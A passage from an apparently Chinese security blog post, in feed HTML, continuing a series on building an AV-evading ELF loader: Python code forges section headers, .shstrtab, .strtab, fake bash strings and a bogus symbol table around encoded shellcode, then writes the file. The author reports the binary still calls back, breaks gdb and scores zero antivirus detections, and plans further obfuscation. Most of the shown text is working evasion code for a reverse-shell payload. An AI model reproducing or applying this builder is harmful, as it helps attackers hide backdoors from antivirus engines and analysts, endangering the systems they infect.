class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(self,index = <span class="number">-1</span>)</span>:</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> index == <span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">b"\x00"</span> + <span class="string">b"\x00"</span>.join( self.__table ) + <span class="string">b"\x00"</span></span><br><span class="line">        <span class="keyword">elif</span> index == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">b"\x00"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">b"\x00"</span> + <span class="string">b"\x00"</span>.join( self.__table[<span class="number">0</span>:index] ) + <span class="string">b"\x00"</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">rand</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># 随机选择一个符号的索引</span></span><br><span class="line">        rand_symbol = random.randint( <span class="number">0</span>,len(self.__table))</span><br><span class="line">        <span class="keyword">return</span> len(self.dump(index = rand_symbol))</span><br></pre></td></tr></table></figure><h3 id="操刀开始伪造"><a href="#操刀开始伪造" class="headerlink" title="操刀开始伪造"></a>操刀开始伪造</h3><p>我们先确定一个我们最终的ELF文件的布局结构：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">最终的 ELF 文件内容部分:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    | elf_header     |</span></span><br><span class="line"><span class="string">    | program_header | </span></span><br><span class="line"><span class="string">    | PT_NOTE        |</span></span><br><span class="line"><span class="string">    | shellcode      |</span></span><br><span class="line"><span class="string">    | PT_TLS         |</span></span><br><span class="line"><span class="string">    | .data.rel.ro   |</span></span><br><span class="line"><span class="string">    | .data          | # 也是一个需要加载的段</span></span><br><span class="line"><span class="string">    | shstrtab       | # 节名称字符串表的内容</span></span><br><span class="line"><span class="string">    | .strtab        |</span></span><br><span class="line"><span class="string">    | SYMTAB         |</span></span><br><span class="line"><span class="string">    | section_header |</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>然后再按照上面确定的布局依次填充内容，修改偏移就可了。首先需要伪造的第一必然是<code>.shstrtab</code> 节的内容，因为所有的其他节的名称都是使用的 <code>.shstrtab</code>字符串表的索引。然后依次伪造其他的节。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建 .shstrtab 节</span></span><br><span class="line">shstrtab_content = Elf_Str_Table()</span><br><span class="line">shstrtab_content.add(</span><br><span class="line">    strings = [ <span class="string">".note.ABI-tag"</span>,</span><br><span class="line">      <span class="string">".shstrtab"</span>,</span><br><span class="line">      <span class="string">".note.gnu.build-id"</span>,</span><br><span class="line">      <span class="string">".text"</span>,</span><br><span class="line">      <span class="string">".data.rel.ro"</span>,</span><br><span class="line">      <span class="string">".symtab"</span>,</span><br><span class="line">      <span class="string">".rodata"</span>,</span><br><span class="line">      <span class="string">".strtab"</span>,</span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 .note.ABI-tag 节    </span></span><br><span class="line">elf_section_note_abi = ElfN_Shdr(</span><br><span class="line">    sh_name = shstrtab_content.index(<span class="string">".note.ABI-tag"</span>) , <span class="comment">#fix it </span></span><br><span class="line">    sh_type = <span class="number">0x7</span>,</span><br><span class="line">    sh_flags = <span class="number">0x2</span>,</span><br><span class="line">    sh_addr = c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">    c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + MEM_VADDR ,</span><br><span class="line">    sh_offset = c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">    c.sizeof( ElfN_Phdr ) *PHEADERS_LEN ,</span><br><span class="line">    sh_size = <span class="number">32</span>,</span><br><span class="line">    sh_link = <span class="number">0x0</span>,</span><br><span class="line">    sh_info = <span class="number">0x0</span>,</span><br><span class="line">    sh_addralign = <span class="number">0x4</span>,</span><br><span class="line">    sh_entsize = <span class="number">0x0</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 .note.gnu.build-id</span></span><br><span class="line">elf_section_note_gnu = ElfN_Shdr(</span><br><span class="line">    sh_name = shstrtab_content.index(<span class="string">".note.gnu.build-id"</span>) , <span class="comment">#fix it </span></span><br><span class="line">    sh_type = <span class="number">0x7</span>,</span><br><span class="line">    sh_flags = <span class="number">0x2</span>,</span><br><span class="line">    sh_addr = c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">    c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + MEM_VADDR + <span class="number">32</span>,</span><br><span class="line">    sh_offset = c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">    c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + <span class="number">32</span>  ,</span><br><span class="line">    sh_size = <span class="number">36</span>,</span><br><span class="line">    sh_link = <span class="number">0x0</span>,</span><br><span class="line">    sh_info = <span class="number">0x0</span>,</span><br><span class="line">    sh_addralign = <span class="number">0x4</span>,</span><br><span class="line">    sh_entsize = <span class="number">0x0</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 .text</span></span><br><span class="line"></span><br><span class="line">elf_section_text = ElfN_Shdr(</span><br><span class="line">    sh_name = shstrtab_content.index(<span class="string">".text"</span>) , <span class="comment">#fix it </span></span><br><span class="line">    sh_type = <span class="number">0x1</span>,</span><br><span class="line">    sh_flags = <span class="number">0x6</span>,</span><br><span class="line">    sh_addr = c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">    c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN +  MEM_VADDR ,</span><br><span class="line">    sh_offset = c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">    c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN,</span><br><span class="line">    sh_size = len(shellcode) ,</span><br><span class="line">    sh_link = <span class="number">0x0</span>,</span><br><span class="line">    sh_info = <span class="number">0x0</span>,</span><br><span class="line">    sh_addralign = <span class="number">0x4</span>,</span><br><span class="line">    sh_entsize = <span class="number">0x0</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 .data.rel.ro</span></span><br><span class="line">elf_section_data_rel = ElfN_Shdr(</span><br><span class="line">    sh_name = shstrtab_content.index(<span class="string">".data.rel.ro"</span>) , <span class="comment">#fix it </span></span><br><span class="line">    sh_type = <span class="number">0x1</span>,</span><br><span class="line">    sh_flags = <span class="number">0x3</span>,</span><br><span class="line">    sh_addr = c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">    c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len( shellcode ) +  MEM_VADDR ,</span><br><span class="line">    sh_offset = c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">    c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len( shellcode ),</span><br><span class="line">    sh_size = LOADABLE_LEN ,</span><br><span class="line">    sh_link = <span class="number">0x0</span>,</span><br><span class="line">    sh_info = <span class="number">0x0</span>,</span><br><span class="line">    sh_addralign = <span class="number">0x4</span>,</span><br><span class="line">    sh_entsize = <span class="number">0x0</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从其他软件中随便抠出来一点字符串来构建 .data 节</span></span><br><span class="line"><span class="comment"># 伪造一些/bin/bash的字符串</span></span><br><span class="line">data_content = Elf_Str_Table()</span><br><span class="line">data_content.add(</span><br><span class="line">    <span class="comment"># /bin/bash 的字符串</span></span><br><span class="line">    strings = [</span><br><span class="line">        <span class="string">"complete [-abcdefgjksuv] [-pr] [-DE] [-o option] [-A action] [-G globpat] [-W wordlist]  [-F function] [-C command] [-X filterpat] [-P prefix] [-S suffix] [name ...]"</span>,</span><br><span class="line">        <span class="string">"compgen [-abcdefgjksuv] [-o option] [-A action] [-G globpat] [-W wordlist]  [-F function] [-C command] [-X filterpat] [-P prefix] [-S suffix] [word]"</span>,</span><br><span class="line">        <span class="string">"compopt [-o|+o option] [-DE] [name ...]"</span>,</span><br><span class="line">        <span class="string">"mapfile [-d delim] [-n count] [-O origin] [-s count] [-t] [-u fd] [-C callback] [-c quantum] [array]"</span>,</span><br><span class="line">        <span class="string">"compopt [-o|+o option] [-DE] [name ...]"</span>,</span><br><span class="line">        <span class="string">"readarray [-n count] [-O origin] [-s count] [-t] [-u fd] [-C callback] [-c quantum] [array]"</span></span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">DATA_LEN = len( data_content.dump() )</span><br><span class="line">elf_section_data = ElfN_Shdr(</span><br><span class="line">    sh_name = shstrtab_content.index(<span class="string">".rodata"</span>) , <span class="comment">#fix it </span></span><br><span class="line">    sh_type = <span class="number">0x1</span>,</span><br><span class="line">    sh_flags = <span class="number">0x3</span>,</span><br><span class="line">    sh_addr = c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">    c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) </span><br><span class="line">    + PT_TLS_LEN + LOADABLE_LEN + MEM_VADDR + <span class="number">0x1000</span>,</span><br><span class="line">    sh_offset = c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">    c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) </span><br><span class="line">    + PT_TLS_LEN + LOADABLE_LEN ,</span><br><span class="line">    sh_size = DATA_LEN,</span><br><span class="line">    sh_link = <span class="number">0x0</span>,</span><br><span class="line">    sh_info = <span class="number">0x0</span>,</span><br><span class="line">    sh_addralign = <span class="number">0x1</span>,</span><br><span class="line">    sh_entsize = <span class="number">0x0</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">SHSTRTAB_LEN = len( shstrtab_content.dump() )</span><br><span class="line">elf_section_shstrtab = ElfN_Shdr(</span><br><span class="line">    sh_name = shstrtab_content.index(<span class="string">".shstrtab"</span>) , <span class="comment">#fix it </span></span><br><span class="line">    sh_type = <span class="number">0x3</span>,</span><br><span class="line">    sh_flags = <span class="number">0x0</span>,</span><br><span class="line">    sh_addr = <span class="number">0x0</span>,</span><br><span class="line">    sh_offset = c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">    c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) </span><br><span class="line">    + PT_TLS_LEN + LOADABLE_LEN + DATA_LEN ,</span><br><span class="line">    sh_size = SHSTRTAB_LEN,</span><br><span class="line">    sh_link = <span class="number">0x0</span>,</span><br><span class="line">    sh_info = <span class="number">0x0</span>,</span><br><span class="line">    sh_addralign = <span class="number">0x1</span>,</span><br><span class="line">    sh_entsize = <span class="number">0x0</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 .strtab</span></span><br><span class="line">VERB = [<span class="string">"read"</span>,<span class="string">"write"</span>,<span class="string">"get"</span>,<span class="string">"set"</span>,<span class="string">"thread"</span>,<span class="string">"start"</span>,<span class="string">"stop"</span>,<span class="string">"close"</span>,<span class="string">"free"</span>,<span class="string">"_IO"</span>]</span><br><span class="line">NOUN = [<span class="string">"name"</span>,<span class="string">"value"</span>,<span class="string">"thread"</span>,<span class="string">"server"</span>,<span class="string">"remote"</span>,<span class="string">"age"</span>,<span class="string">"table"</span>]</span><br><span class="line">strtab_content = Elf_Str_Table()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    tmp = random.choice( VERB ) + <span class="string">"_"</span> + random.choice( NOUN )</span><br><span class="line">    strtab_content.add( string=tmp )</span><br><span class="line"></span><br><span class="line">STRTAB_LEN = len(strtab_content.dump())</span><br><span class="line">elf_section_strtab = ElfN_Shdr(</span><br><span class="line">    sh_name = shstrtab_content.index(<span class="string">".strtab"</span>) , <span class="comment">#fix it </span></span><br><span class="line">    sh_type = <span class="number">0x3</span>,</span><br><span class="line">    sh_flags = <span class="number">0x0</span>,</span><br><span class="line">    sh_addr = <span class="number">0x0</span>,</span><br><span class="line">    sh_offset = c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">    c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) </span><br><span class="line">    + LOADABLE_LEN + PT_TLS_LEN + DATA_LEN + SHSTRTAB_LEN ,</span><br><span class="line">    sh_size = STRTAB_LEN,</span><br><span class="line">    sh_link = <span class="number">0x0</span>,</span><br><span class="line">    sh_info = <span class="number">0x0</span>,</span><br><span class="line">    sh_addralign = <span class="number">0x1</span>,</span><br><span class="line">    sh_entsize = <span class="number">0x0</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>下面才是我们的重头戏，开始伪造我们的符号表：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 伪造 .symtab 节的数据</span></span><br><span class="line"></span><br><span class="line">sym_list = []</span><br><span class="line">sym_list_len = <span class="number">10</span></span><br><span class="line"><span class="comment"># 在 .text 节伪造 10 个函数符号</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(sym_list_len):</span><br><span class="line"></span><br><span class="line">        sym_tmp = ElfN_Sym(</span><br><span class="line">            st_name = strtab_content.rand(),</span><br><span class="line">            st_info = (<span class="number">0</span> &lt;&lt; <span class="number">4</span> | <span class="number">2</span>),</span><br><span class="line">            st_other = <span class="number">0</span>,</span><br><span class="line">            st_shndx = <span class="number">0x3</span>, <span class="comment"># 所在的节索引，.text节</span></span><br><span class="line">            <span class="comment"># st_value = MEM_VADDR +  c.sizeof( ElfN_Ehdr ) + \</span></span><br><span class="line">            <span class="comment"># c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + len(shellcode) +  PT_NOTE_LEN  + PT_TLS_LEN + i*0x30 ,</span></span><br><span class="line">            st_value = MEM_VADDR  + c.sizeof( ElfN_Ehdr ) + \</span><br><span class="line">            c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + i*<span class="number">0x20</span> ,</span><br><span class="line">            <span class="comment"># st_value = 0x08048118,</span></span><br><span class="line">            st_size = <span class="number">0x20</span>,</span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># sym_tmp = ElfN_Sym()</span></span><br><span class="line">        sym_list.append(sym_tmp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(sym_list_len):</span><br><span class="line">    <span class="comment"># 在第二个可加载段中伪造 10 个函数符号</span></span><br><span class="line">    sym_tmp = ElfN_Sym(</span><br><span class="line">        st_name = strtab_content.rand(),</span><br><span class="line">        st_info = (<span class="number">0</span> &lt;&lt; <span class="number">4</span> | <span class="number">2</span>),</span><br><span class="line">        st_other = <span class="number">0</span>,</span><br><span class="line">        st_shndx = <span class="number">0x3</span>, <span class="comment"># 所在的节索引，.text节</span></span><br><span class="line">        <span class="comment"># st_value = MEM_VADDR +  c.sizeof( ElfN_Ehdr ) + \</span></span><br><span class="line">        <span class="comment"># c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + len(shellcode) +  PT_NOTE_LEN  + PT_TLS_LEN + i*0x30 ,</span></span><br><span class="line">        st_value = MEM_VADDR  + c.sizeof( ElfN_Ehdr ) + \</span><br><span class="line">        c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) + <span class="number">0x1000</span> + i*<span class="number">0x40</span> ,</span><br><span class="line">        <span class="comment"># st_value = 0x08048118,</span></span><br><span class="line">        st_size = <span class="number">0x40</span>,</span><br><span class="line">    )</span><br><span class="line">    <span class="comment"># sym_tmp = ElfN_Sym()</span></span><br><span class="line">    sym_list.append(sym_tmp)</span><br><span class="line"></span><br><span class="line">sym_list_len = len(sym_list)</span><br><span class="line">elf_section_symtab = ElfN_Shdr(</span><br><span class="line">    sh_name = shstrtab_content.index(<span class="string">".symtab"</span>) , <span class="comment">#fix it </span></span><br><span class="line">    sh_type = <span class="number">0x2</span>,</span><br><span class="line">    sh_flags = <span class="number">0x0</span>,</span><br><span class="line">    sh_addr = <span class="number">0x0</span>,</span><br><span class="line">    sh_offset = c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">    c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) </span><br><span class="line">    + LOADABLE_LEN + PT_TLS_LEN + DATA_LEN + SHSTRTAB_LEN + STRTAB_LEN ,</span><br><span class="line">    sh_size = sym_list_len * c.sizeof( ElfN_Sym ),</span><br><span class="line">    sh_link = <span class="number">0x7</span>,</span><br><span class="line">    sh_info = <span class="number">0</span>, <span class="comment">#  a symbol table section's sh_info section header member holds the symbol table index for the first non-local symbol.</span></span><br><span class="line">    sh_addralign = <span class="number">0x4</span>,</span><br><span class="line">    sh_entsize =  c.sizeof( ElfN_Sym )</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>注意<code>.symtab</code>节表的 <code>sh_info</code> 表达的含义，乱写可能会导致ida解析出错(被这个问题卡了很久)。最后我们将伪造的所有数据写入一个ELF文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">    </span><br><span class="line">elf_section_undef = ElfN_Shdr(</span><br><span class="line">    sh_name = <span class="number">0x0</span>,</span><br><span class="line">    sh_type = <span class="number">0x0</span>,</span><br><span class="line">    sh_flags = <span class="number">0x0</span>,</span><br><span class="line">    sh_addr = <span class="number">0x0</span>,</span><br><span class="line">    sh_offset = <span class="number">0x0</span>,</span><br><span class="line">    sh_link = <span class="number">0x0</span>,</span><br><span class="line">    sh_info = <span class="number">0x0</span>,</span><br><span class="line">    sh_addralign = <span class="number">0x0</span>,</span><br><span class="line">    sh_entsize = <span class="number">0x0</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">sections = [</span><br><span class="line">    elf_section_undef,</span><br><span class="line">    elf_section_note_abi,</span><br><span class="line">    elf_section_note_gnu,</span><br><span class="line">    elf_section_text,</span><br><span class="line">    elf_section_data_rel,</span><br><span class="line">    elf_section_data,</span><br><span class="line">    elf_section_symtab,</span><br><span class="line">    elf_section_strtab,</span><br><span class="line">    elf_section_shstrtab,</span><br><span class="line">]</span><br><span class="line">elf_section_symtab.sh_link = sections.index( elf_section_strtab )</span><br><span class="line">e_shoff = elf_section_symtab.sh_offset + elf_section_symtab.sh_size</span><br><span class="line">e_shoff_pad = <span class="number">4</span> + (<span class="number">4</span> - (e_shoff &amp; <span class="number">3</span>)) &amp; <span class="number">3</span></span><br><span class="line"></span><br><span class="line">elf_header.e_shoff = elf_section_symtab.sh_offset + elf_section_symtab.sh_size + e_shoff_pad</span><br><span class="line">elf_header.e_shstrndx = len( sections ) - <span class="number">1</span></span><br><span class="line">elf_header.e_shnum = len( sections )</span><br><span class="line">elf_header.e_shentsize = c.sizeof( ElfN_Shdr )</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">with</span> open(FILENAME,<span class="string">"wb"</span>) <span class="keyword">as</span> fd:</span><br><span class="line">    elf_header_bytes = c.string_at(c.addressof(elf_header),c.sizeof(elf_header))</span><br><span class="line">    fd.write( elf_header_bytes)</span><br><span class="line">    <span class="keyword">for</span> ph <span class="keyword">in</span> pheaders:</span><br><span class="line">        fd.write( c.string_at( c.addressof(ph),c.sizeof(ph) ) )</span><br><span class="line">    </span><br><span class="line">    fd.write( bytes([ random.randint(<span class="number">0x00</span>,<span class="number">0xff</span>) <span class="keyword">for</span> i <span class="keyword">in</span>  range(PT_NOTE_LEN)]  ) )</span><br><span class="line">    fd.write(shellcode)</span><br><span class="line">    fd.write( bytes( [ random.randint(<span class="number">0x00</span>,<span class="number">0xff</span>) <span class="keyword">for</span> i <span class="keyword">in</span>  range(PT_TLS_LEN)] )  )</span><br><span class="line">    fd.write( bytes( [ random.randint(<span class="number">0x00</span>,<span class="number">0xff</span>) <span class="keyword">for</span> i <span class="keyword">in</span>  range(LOADABLE_LEN)] ) )</span><br><span class="line">    fd.write( data_content.dump() )</span><br><span class="line">    fd.write( shstrtab_content.dump() )</span><br><span class="line">    fd.write( strtab_content.dump() )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 写入符号</span></span><br><span class="line">    <span class="keyword">for</span> tmp <span class="keyword">in</span> sym_list:</span><br><span class="line">        fd.write( c.string_at( c.addressof(tmp),c.sizeof(tmp) ) )</span><br><span class="line">    </span><br><span class="line">    fd.write( <span class="string">b"\x00"</span> * e_shoff_pad  )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> se <span class="keyword">in</span> sections:</span><br><span class="line">        fd.write( c.string_at( c.addressof(se),c.sizeof(se) ) )</span><br></pre></td></tr></table></figure><h2 id="检查最后的伪造效果"><a href="#检查最后的伪造效果" class="headerlink" title="检查最后的伪造效果"></a>检查最后的伪造效果</h2><p>在进行符号伪造之前，代码相对来讲还是比较清晰可见的。</p><p><img src="https://pic.wonderkun.cc//uploads/note/20210727110004.png" alt=""></p><p>进行符号伪造之后，所有的一切都看起来非常的凌乱。</p><p><img src="https://pic.wonderkun.cc//uploads/note/20210727110144.png" alt=""></p><p>其实这里的符号信息就类似于自然语言中的断句，们相当于随意的插入了一些标点符号，导致反编译结果混糅杂乱。</p><p>这个二进制功能是正常的，可以成功回连。<br><img src="https://pic.wonderkun.cc//uploads/note/20210727111139.png" alt=""></p><p>除此之外，还有一个意外收获，这个二进制gdb无法调试。</p><p><img src="https://pic.wonderkun.cc//uploads/note/20210727111346.png" alt=""></p><p>至于为什么无法被gdb加载，我们日后再写文章进行详细的解释。<br>最后看一下免杀效果，其实都不用看，肯定是妥妥的0查杀呗。</p><p><img src="https://pic.wonderkun.cc//uploads/note/20210727114505.png" alt=""></p><p>虽然本文费尽心机做了一些障眼法，但是也只是能够欺骗静态的杀毒引擎以及没有经验的安全工作人员，并不能真正的增加人工分析的难度，所以在下一篇文章中我决定进一步的编写花指令生成和指令混淆等功能。本文到此为止，后续敬请期待…..</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;本文首发于安全客: &lt;a href=&quot;https://www.anquanke.com/post/id/248688&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/248688&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在上一节我们已经通过自己编写的编码器对shellcode进行了编码，并且构建了一个ELF文件，但是出乎意料的是&lt;code&gt;McAfee&lt;/code&gt; 和 &lt;code&gt;McAfee-GW-Edition&lt;/code&gt; 还会报毒为木马，经过我的研究，我发现&lt;code&gt;McAfee&lt;/code&gt;判黑的逻辑非常简单，只要文件大小小于某个阈值，并且&lt;code&gt;EntryPoint&lt;/code&gt;附近有无法反汇编的数据，就会被报黑。这么看来，想让上一节的ELF文件不被所有的引擎检测就非常简单了，只需要在文件结尾再写一些乱数据就搞定了。&lt;/p&gt;
    
    </summary>
    
      <category term="学习记录" scheme="http://blog.wonderkun.cc/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
